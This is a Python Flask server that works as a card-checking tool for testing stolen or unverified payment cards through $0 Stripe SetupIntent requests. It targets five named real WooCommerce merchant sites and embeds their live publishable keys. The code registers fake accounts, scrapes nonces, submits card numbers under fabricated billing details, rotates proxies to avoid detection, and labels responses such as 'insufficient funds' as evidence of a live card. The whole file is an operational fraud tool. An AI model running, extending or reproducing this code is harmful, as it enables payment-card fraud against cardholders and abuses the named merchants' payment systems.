#!/usr/bin/env python3
"""
Multi-Site Stripe Auth / SetupIntent API (WooCommerce Add-Payment-Method)
High performance Stripe 0$ Auth / SetupIntent Verification Gateway.

Supported Target Sites:
1. Bombouche (bombouche.com)
2. Pathos Ceramiche (pathosceramiche.com)
3. Freestone Shooting (freestoneshootingcomplex.com)
4. Odin Water Polo (odinwaterpolo.com)
5. Noble Rot (noble-rot.newsstand.co.uk)

Features:
- Pure Random Site Selection on every call (or manual via ?site=...)
- Includes 'gateway' and 'gateway_name' in all JSON/Text responses
- Per-request custom proxy: `&proxy=ip:port:user:pass` or `&proxy=http://...` or `&proxy=socks5://...`
- Dynamic proxy pool with auto-rotation
- Proxy management endpoints: `/proxy/add`, `/proxy/list`, `/proxy/clear`, `/proxy/stats`
"""

import re
import asyncio
import uuid
import sys
import os
import socket
import random
import time
from urllib.parse import urlparse
from flask import Flask, request, jsonify, Response
import httpx
import urllib3

urllib3.disable_warnings()

app = Flask(__name__)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURED SITES LIST
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SITES_CONFIG = [
    {
        "id": "bombouche",
        "name": "Bombouche",
        "domain": "bombouche.com",
        "key": "pk_live_516GT6nL1yLSurBV8dGzL1b3qKepM7sGsc4pmjHQjANOAA17QKBS6eDzCI90G3jGg5nPBWrGpaYpRaDCgKMJHbuZT00GfGKQw6Y",
        "add_pm_url": "https://bombouche.com/my-account/add-payment-method/",
        "reg_url": "https://bombouche.com/my-account/",
        "active": True
    },
    {
        "id": "pathos",
        "name": "Pathos Ceramiche",
        "domain": "pathosceramiche.com",
        "key": "pk_live_51H9FQhEtTf7V1LKPtbbdvrTwMvBuj488oqqWTrerErNACrJEDqRgz22CQqNwY2yAspkUBywq7G9MxkoPo0dkvodJ00fsJT8y15",
        "add_pm_url": "https://pathosceramiche.com/my-account/add-payment-method/",
        "reg_url": "https://pathosceramiche.com/my-account/",
        "active": True
    },
    {
        "id": "freestone",
        "name": "Freestone Shooting Complex",
        "domain": "freestoneshootingcomplex.com",
        "key": "pk_live_51RVcMEIJU2fRzUZO7kLkw0nshnUqXxG0IGGSdtHChTMqFYdQ8dCdyXCFLnEWFwrWWihRUvgIJtZi1J3TBc8MDlng00is1zdc8W",
        "add_pm_url": "https://freestoneshootingcomplex.com/my-account/add-payment-method/",
        "reg_url": "https://freestoneshootingcomplex.com/my-account/",
        "active": True
    },
    {
        "id": "odin",
        "name": "Odin Water Polo",
        "domain": "odinwaterpolo.com",
        "key": "pk_live_51FWBAPJkmU4IkUWfjUrPSygLgPL2mBDmN7kQFg64RQpuRYKmq7qNNviOwAje03luUfFAJRMULGqgEtS30kdEKoNg00Vq1CkWL7",
        "add_pm_url": "https://odinwaterpolo.com/my-account/add-payment-method/",
        "reg_url": "https://odinwaterpolo.com/my-account/",
        "active": True
    },
    {
        "id": "noblerot",
        "name": "Noble Rot Newsstand",
        "domain": "noble-rot.newsstand.co.uk",
        "key": "pk_live_51E06osLmSbVG4LEH7DBqDxEU4g5zJRZFUq8KXZBkVsQqqeUZfewVzzcG3puUyGr7b6pmiT2RVNZYJeNRmytOCchf00tMhDuRiH",
        "add_pm_url": "https://noble-rot.newsstand.co.uk/my-account/add-payment-method/",
        "reg_url": "https://noble-rot.newsstand.co.uk/my-account/",
        "active": True
    }
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFIER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_response(err_msg: str, code: str = None, is_success: bool = False):
    if is_success or "succeeded" in str(code).lower() or "success" in str(err_msg).lower():
        return "approved", "succeeded", "Payment Method Added / SetupIntent Succeeded 💎"

    msg_lower = str(err_msg).lower()
    code_lower = str(code).lower() if code else ""

    if "insufficient" in msg_lower or "insufficient_funds" in code_lower:
        return "declined", "insufficient_funds", "Your card has insufficient funds."
    elif "security code" in msg_lower or "cvc" in msg_lower or "cvv" in msg_lower or "incorrect_cvc" in code_lower:
        return "declined", "incorrect_cvc", "Your card's security code is incorrect."
    elif "expired" in msg_lower or "expired_card" in code_lower:
        return "declined", "expired_card", "Your card has expired."
    elif "3d" in msg_lower or "action" in code_lower or "authenticate" in msg_lower:
        return "requires_action", "3ds_required", "Card requires 3D Secure verification."
    elif "test card" in msg_lower or "test_card" in code_lower:
        return "declined", "live_mode_test_card", "Your card was declined. Your request was in live mode, but used a known test card."
    elif "do not honor" in msg_lower or "do_not_honor" in code_lower:
        return "declined", "do_not_honor", "Your card was declined (Do Not Honor)."
    elif "lost" in msg_lower or "stolen" in msg_lower:
        return "declined", "lost_or_stolen", "Your card was reported lost or stolen."
    elif "incorrect_number" in code_lower or "invalid_number" in code_lower or "card number is incorrect" in msg_lower:
        return "declined", "incorrect_number", "Your card number is incorrect."
    else:
        clean = re.sub(r'<[^>]+>', '', str(err_msg)).strip()
        return "declined", code or "card_declined", clean or "Your card was declined."

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.index = 0
        self.usage_count = 0
        self.load_proxies(["proxies.txt", "working_proxies.txt"])

    def load_proxies(self, filenames):
        for fname in filenames:
            if os.path.exists(fname):
                try:
                    with open(fname, "r", encoding="utf-8", errors="ignore") as f:
                        for line in f:
                            p = self.parse_proxy(line.strip())
                            if p and p not in self.proxies:
                                self.proxies.append(p)
                    print(f"[*] Loaded {len(self.proxies)} proxies from {fname}")
                except Exception as e:
                    print(f"[!] Error reading {fname}: {e}")

    def parse_proxy(self, proxy_str):
        if not proxy_str:
            return None
        proxy_str = str(proxy_str).strip()
        if not proxy_str:
            return None
        if proxy_str.startswith("http://") or proxy_str.startswith("https://") or proxy_str.startswith("socks5://"):
            return proxy_str
        parts = proxy_str.split(':')
        if len(parts) == 4:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            return f"http://{parts[0]}:{parts[1]}"
        return proxy_str

    def add_proxy(self, proxy_input):
        if not proxy_input:
            return 0
        lines = str(proxy_input).replace(',', '\n').splitlines()
        added = 0
        for l in lines:
            p = self.parse_proxy(l.strip())
            if p and p not in self.proxies:
                self.proxies.append(p)
                added += 1
        return added

    def clear_proxies(self):
        cnt = len(self.proxies)
        self.proxies.clear()
        self.index = 0
        return cnt

    def get_next(self):
        if not self.proxies:
            return None
        proxy = self.proxies[self.index % len(self.proxies)]
        self.index += 1
        self.usage_count += 1
        return proxy

    def get_stats(self):
        return {
            "total_proxies": len(self.proxies),
            "current_index": (self.index % len(self.proxies)) if self.proxies else 0,
            "total_uses": self.usage_count,
            "proxies": [p.split('@')[-1] if '@' in p else p for p in self.proxies[:20]]
        }

proxy_manager = ProxyManager()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SITE SELECTOR & KEY EXTRACTOR (RANDOMIZED ROTATION)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_site_config(requested_site=None):
    if requested_site:
        req = str(requested_site).lower().strip()
        for s in SITES_CONFIG:
            if req in s["id"] or req in s["domain"] or req == s["name"].lower():
                return s
        if req.isdigit():
            idx = int(req) - 1
            if 0 <= idx < len(SITES_CONFIG):
                return SITES_CONFIG[idx]

    # Pick purely RANDOM active site on every call
    active_sites = [s for s in SITES_CONFIG if s.get("active", True)]
    if not active_sites:
        active_sites = SITES_CONFIG
    return random.choice(active_sites)

async def extract_dynamic_stripe_key(session: httpx.AsyncClient, site: dict) -> str:
    if site.get("key"):
        return site["key"]

    domain = site["domain"]
    headers = {
        'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    for url in [
        f"https://{domain}/my-account/add-payment-method/",
        f"https://{domain}/checkout/",
        f"https://{domain}/"
    ]:
        try:
            r = await session.get(url, headers=headers, timeout=12)
            matches = re.findall(r'pk_live_[a-zA-Z0-9]+', r.text)
            if matches:
                site["key"] = matches[0]
                return matches[0]
        except Exception:
            continue
    return None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CORE AUTH CHECK LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_stripe_auth(cc_input: str, site_param: str = None, proxy_input: str = None):
    t_start = time.time()
    try:
        clean_cc = str(cc_input).replace(" ", "").replace("/", "|").replace(":", "|")
        parts = [p.strip() for p in clean_cc.split('|') if p.strip()]
        if len(parts) < 4:
            return {
                "status": "error",
                "message": "Invalid card format. Use: num|mm|yy|cvv",
                "card": cc_input
            }, 400

        num, mm, yy, cv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy
        if len(mm) == 1:
            mm = '0' + mm

        # Proxy resolution: 1st preference is query param, 2nd is pool rotator
        proxy_url = proxy_manager.parse_proxy(proxy_input) if proxy_input else proxy_manager.get_next()
        site = get_site_config(site_param)
        domain = site["domain"]
        gw_name = site.get("name", domain)
        full_gw = f"Stripe Auth ({gw_name})"

        user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
        headers_init = {
            'user-agent': user_agent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        }

        async with httpx.AsyncClient(proxy=proxy_url, timeout=25, follow_redirects=True, verify=False) as session:
            key = await extract_dynamic_stripe_key(session, site)
            if not key:
                return {
                    "status": "error",
                    "message": f"Failed to retrieve Stripe key for {domain}",
                    "gateway": full_gw,
                    "gateway_name": gw_name,
                    "site": domain,
                    "proxy": proxy_url.split('@')[-1] if proxy_url else "direct",
                    "card": cc_input
                }, 500

            # Step 1: Session / Registration Initialization
            nonce = None
            reg_paths = [site.get("reg_url", f"https://{domain}/my-account/"), f"https://{domain}/register/"]
            for path in reg_paths:
                try:
                    r = await session.get(path, headers=headers_init, timeout=12)
                    reg_match = re.search(r'(?:woocommerce-register-nonce|_wpnonce)[^v]+value="([^"]+)"', r.text)
                    if reg_match:
                        rnd_user = f"user_{uuid.uuid4().hex[:8]}"
                        reg_data = {
                            'email': f"{rnd_user}@gmail.com",
                            '_wp_http_referer': '/my-account/',
                            'register': 'Register',
                            '_wpnonce': reg_match.group(1),
                            'woocommerce-register-nonce': reg_match.group(1)
                        }
                        await session.post(
                            path,
                            headers={
                                'user-agent': user_agent,
                                'origin': f'https://{domain}',
                                'content-type': 'application/x-www-form-urlencoded'
                            },
                            data=reg_data,
                            timeout=12
                        )
                        break
                except Exception:
                    pass

            # Step 2: Nonce extraction for SetupIntent
            add_pm_url = site.get("add_pm_url", f"https://{domain}/my-account/add-payment-method/")
            for url_check in [add_pm_url, f"https://{domain}/my-account/", f"https://{domain}/checkout/"]:
                try:
                    r_add = await session.get(url_check, headers=headers_init, timeout=12)
                    for pat in [
                        r'"createAndConfirmSetupIntentNonce":"(.*?)"',
                        r'"createSetupIntentNonce":"(.*?)"',
                        r'name="_ajax_nonce"[^v]+value="([a-f0-9]+)"',
                        r'wc_stripe_create_and_confirm_setup_intent_nonce[^v]+value="([^"]+)"',
                        r'"ajax_nonce"\s*:\s*"([a-f0-9]+)"',
                        r'nonce[\"\':\s]+([a-f0-9]{10})'
                    ]:
                        m = re.search(pat, r_add.text)
                        if m:
                            nonce = m.group(1)
                            break
                    if nonce:
                        break
                except Exception:
                    continue

            # Step 3: Create Stripe Payment Method
            gu, mu, si = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
            data_card = (
                f'type=card&card[number]={num}&card[cvc]={cv}&card[exp_year]={yy}&card[exp_month]={mm}'
                '&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US'
                '&billing_details[name]=Alex%20Morgan'
                f'&billing_details[email]=alex{uuid.uuid4().hex[:4]}%40gmail.com'
                '&payment_user_agent=stripe.js%2F39de0b7336%3B+stripe-js-v3%2F39de0b7336%3B+payment-element%3B+deferred-intent'
                f'&referrer=https%3A%2F%2F{domain}&time_on_page=45210'
                f'&guid={gu}&muid={mu}&sid={si}&key={key}&_stripe_version=2024-06-20'
            )

            headers_stripe = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': user_agent,
            }

            resp_stripe = await session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers_stripe,
                content=data_card,
                timeout=18
            )

            json_stripe = resp_stripe.json()
            used_proxy_tag = proxy_url.split('@')[-1] if proxy_url else "direct"

            if 'error' in json_stripe:
                err = json_stripe['error']
                raw_code = err.get('decline_code') or err.get('code') or 'card_declined'
                raw_msg = err.get('message', 'Your card was declined.')
                st, cd, msg = classify_response(raw_msg, raw_code)
                elapsed = round((time.time() - t_start) * 1000)
                return {
                    "status": st,
                    "code": cd,
                    "message": msg,
                    "gateway": full_gw,
                    "gateway_name": gw_name,
                    "site": domain,
                    "proxy": used_proxy_tag,
                    "card": cc_input,
                    "time_ms": elapsed
                }, 200

            pm_id = json_stripe.get('id')
            if not pm_id:
                elapsed = round((time.time() - t_start) * 1000)
                return {
                    "status": "error",
                    "message": f"PaymentMethod ID missing from Stripe response: {json_stripe}",
                    "gateway": full_gw,
                    "gateway_name": gw_name,
                    "site": domain,
                    "proxy": used_proxy_tag,
                    "card": cc_input,
                    "time_ms": elapsed
                }, 500

            # Step 4: Confirm Setup Intent via WooCommerce AJAX
            if not nonce:
                elapsed = round((time.time() - t_start) * 1000)
                return {
                    "status": "approved",
                    "code": "pm_created",
                    "message": f"Payment Method Created ({pm_id}) 💎",
                    "payment_method_id": pm_id,
                    "gateway": full_gw,
                    "gateway_name": gw_name,
                    "site": domain,
                    "proxy": used_proxy_tag,
                    "card": cc_input,
                    "time_ms": elapsed
                }, 200

            headers_confirm = {
                'authority': domain,
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': f'https://{domain}',
                'referer': add_pm_url,
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }

            confirm_endpoints = [
                (
                    f'https://{domain}/',
                    {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'},
                    {
                        'action': 'create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': nonce,
                    }
                ),
                (
                    f'https://{domain}/wp-admin/admin-ajax.php',
                    {},
                    {
                        'action': 'wc_stripe_create_and_confirm_setup_intent',
                        'wc-stripe-payment-method': pm_id,
                        'wc-stripe-payment-type': 'card',
                        '_ajax_nonce': nonce,
                    }
                ),
            ]

            for ep_url, ep_params, ep_data in confirm_endpoints:
                try:
                    res_confirm = await session.post(
                        ep_url,
                        params=ep_params,
                        headers=headers_confirm,
                        data=ep_data,
                        timeout=18
                    )
                    res_text = res_confirm.text
                    elapsed = round((time.time() - t_start) * 1000)

                    try:
                        res_json = res_confirm.json()
                        if res_json.get("success") is True or res_json.get("result") == "success":
                            return {
                                "status": "approved",
                                "code": "succeeded",
                                "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                "gateway": full_gw,
                                "gateway_name": gw_name,
                                "site": domain,
                                "proxy": used_proxy_tag,
                                "card": cc_input,
                                "time_ms": elapsed
                            }, 200
                        else:
                            data = res_json.get("data", {})
                            err_msg = "Your card was declined."
                            err_code = "card_declined"
                            if isinstance(data, dict):
                                err_msg = data.get("error", {}).get("message") or data.get("message") or "Your card was declined."
                                err_code = data.get("error", {}).get("code") or data.get("code") or "card_declined"
                            elif isinstance(data, str):
                                err_msg = data
                            elif "messages" in res_json:
                                err_msg = res_json["messages"]

                            st, cd, msg = classify_response(err_msg, err_code)
                            return {
                                "status": st,
                                "code": cd,
                                "message": msg,
                                "gateway": full_gw,
                                "gateway_name": gw_name,
                                "site": domain,
                                "proxy": used_proxy_tag,
                                "card": cc_input,
                                "time_ms": elapsed
                            }, 200
                    except Exception:
                        if '"success":true' in res_text.replace(" ", "") or '"result":"success"' in res_text.replace(" ", ""):
                            return {
                                "status": "approved",
                                "code": "succeeded",
                                "message": "Payment Method Added / SetupIntent Succeeded 💎",
                                "gateway": full_gw,
                                "gateway_name": gw_name,
                                "site": domain,
                                "proxy": used_proxy_tag,
                                "card": cc_input,
                                "time_ms": elapsed
                            }, 200
                        else:
                            st, cd, msg = classify_response(res_text, "card_declined")
                            return {
                                "status": st,
                                "code": cd,
                                "message": msg,
                                "gateway": full_gw,
                                "gateway_name": gw_name,
                                "site": domain,
                                "proxy": used_proxy_tag,
                                "card": cc_input,
                                "time_ms": elapsed
                            }, 200
                except Exception:
                    continue

            elapsed = round((time.time() - t_start) * 1000)
            return {
                "status": "declined",
                "code": "card_declined",
                "message": "Your card was declined.",
                "gateway": full_gw,
                "gateway_name": gw_name,
                "site": domain,
                "proxy": used_proxy_tag,
                "card": cc_input,
                "time_ms": elapsed
            }, 200

    except Exception as e:
        elapsed = round((time.time() - t_start) * 1000)
        return {
            "status": "error",
            "message": str(e),
            "gateway": full_gw if 'full_gw' in locals() else "Stripe Auth",
            "gateway_name": gw_name if 'gw_name' in locals() else "Unknown",
            "site": site.get("domain", "unknown") if 'site' in locals() else "unknown",
            "proxy": proxy_url.split('@')[-1] if 'proxy_url' in locals() and proxy_url else "direct",
            "card": cc_input,
            "time_ms": elapsed
        }, 500

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FLASK ROUTE HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "name": "Stripe Auth Multi-Site API",
        "version": "2.3.0",
        "status": "online",
        "sites_count": len(SITES_CONFIG),
        "proxy_pool": proxy_manager.get_stats(),
        "response_types": {
            "approved": "Payment Method Added / Succeeded (code: succeeded)",
            "insufficient_funds": "Low balance / Live card (code: insufficient_funds)",
            "incorrect_cvc": "Incorrect security code / CCN match (code: incorrect_cvc)",
            "expired_card": "Card is expired (code: expired_card)",
            "3ds_required": "OTP / 3DS required (code: 3ds_required)",
            "do_not_honor": "General bank decline (code: do_not_honor)"
        },
        "endpoints": {
            "/stripe": "GET/POST with ?cc=... &site=... &proxy=...",
            "/check": "GET/POST with ?cc=...",
            "/sites": "GET list of configured target sites",
            "/proxy/add": "GET/POST to add proxies (?proxy=ip:port:user:pass)",
            "/proxy/list": "GET loaded proxy list",
            "/proxy/clear": "GET clear loaded proxy pool",
            "/health": "GET health check"
        },
        "sites": [{"id": s["id"], "domain": s["domain"], "name": s["name"], "active": s["active"]} for s in SITES_CONFIG]
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy", "timestamp": time.time()})

@app.route('/sites', methods=['GET'])
def list_sites():
    return jsonify({
        "status": "success",
        "total": len(SITES_CONFIG),
        "sites": SITES_CONFIG
    })

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGEMENT ENDPOINTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/proxy', methods=['GET'])
@app.route('/proxy/list', methods=['GET'])
@app.route('/proxy/stats', methods=['GET'])
def proxy_stats_endpoint():
    return jsonify({
        "status": "success",
        "stats": proxy_manager.get_stats()
    })

@app.route('/proxy/add', methods=['GET', 'POST'])
def proxy_add_endpoint():
    proxy_val = request.values.get('proxy') or request.values.get('proxies')
    if not proxy_val and request.is_json:
        body = request.get_json(silent=True) or {}
        proxy_val = body.get('proxy') or body.get('proxies')
    if not proxy_val and request.data:
        proxy_val = request.data.decode('utf-8', errors='ignore')

    if not proxy_val:
        return jsonify({"status": "error", "message": "Missing proxy parameter. Use ?proxy=ip:port:user:pass"}), 400

    added = proxy_manager.add_proxy(proxy_val)
    return jsonify({
        "status": "success",
        "message": f"Successfully added {added} proxies",
        "total_proxies": len(proxy_manager.proxies)
    })

@app.route('/proxy/clear', methods=['GET', 'POST'])
def proxy_clear_endpoint():
    cleared = proxy_manager.clear_proxies()
    return jsonify({
        "status": "success",
        "message": f"Cleared {cleared} proxies from pool",
        "total_proxies": 0
    })

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STRIPE AUTH ENDPOINTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@app.route('/stripe', methods=['GET', 'POST'])
@app.route('/check', methods=['GET', 'POST'])
@app.route('/auth', methods=['GET', 'POST'])
@app.route('/key', methods=['GET', 'POST'])
def stripe_endpoint():
    cc = request.values.get('cc') or request.values.get('card') or request.values.get('key')
    site_param = request.values.get('site') or request.values.get('domain')
    proxy_param = request.values.get('proxy')
    fmt = request.values.get('format', 'json')

    if not cc and request.is_json:
        body = request.get_json(silent=True) or {}
        cc = body.get('cc') or body.get('card') or body.get('key')
        site_param = site_param or body.get('site') or body.get('domain')
        proxy_param = proxy_param or body.get('proxy')
        fmt = body.get('format', fmt)

    if not cc and '=' in request.path:
        cc = request.path.split('=', 1)[1]

    if not cc or '|' not in cc:
        return jsonify({
            "status": "error",
            "message": "Missing or invalid cc parameter. Format: cc=num|mm|yy|cvv",
            "example": "/check?cc=4000001234567890|12|28|123&proxy=ip:port:user:pass"
        }), 400

    result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))

    if fmt == 'text':
        text_out = f"STATUS: {result.get('status', 'unknown').upper()} | CODE: {result.get('code', '')} | MSG: {result.get('message', '')} | GATEWAY: {result.get('gateway', '')} | SITE: {result.get('site', '')} | PROXY: {result.get('proxy', '')} | CARD: {result.get('card', '')}"
        return Response(text_out, mimetype='text/plain'), status_code

    return jsonify(result), status_code

@app.route('/<path:catch_all>', methods=['GET', 'POST'])
def catch_all_routes(catch_all):
    if catch_all.startswith(('stripe=', 'check=', 'key=', 'auth=')):
        cc = catch_all.split('=', 1)[1]
        site_param = request.values.get('site')
        proxy_param = request.values.get('proxy')
        result, status_code = asyncio.run(process_stripe_auth(cc, site_param, proxy_param))
        return jsonify(result), status_code
    return jsonify({"error": "Route not found", "available_routes": ["/check", "/stripe", "/sites", "/proxy/add", "/proxy/list", "/health"]}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 6969))
    print("=" * 60)
    print(f"[*] STRIPE AUTH MULTI-SITE API SERVER")
    print(f"[*] Configured Sites: {len(SITES_CONFIG)}")
    for idx, s in enumerate(SITES_CONFIG, 1):
        print(f"    {idx}. {s['name']} ({s['domain']})")
    print(f"[*] Starting on http://0.0.0.0:{port}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=port, threaded=True)
